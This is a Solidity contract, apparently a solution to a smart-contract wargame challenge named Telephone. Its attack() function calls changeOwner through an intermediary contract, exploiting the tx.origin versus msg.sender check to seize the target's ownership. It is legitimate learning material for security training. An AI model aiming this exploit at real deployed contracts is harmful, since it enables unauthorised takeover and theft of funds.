// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ITelephone {
    function changeOwner(address _owner) external;
}


contract TelephoneAttack {
    
    ITelephone public challenge;

    constructor(address challengeAddress) {
        challenge = ITelephone(challengeAddress);
    }

    function attack() external payable {
        challenge.changeOwner(tx.origin);
    }

    receive() external payable {}
}
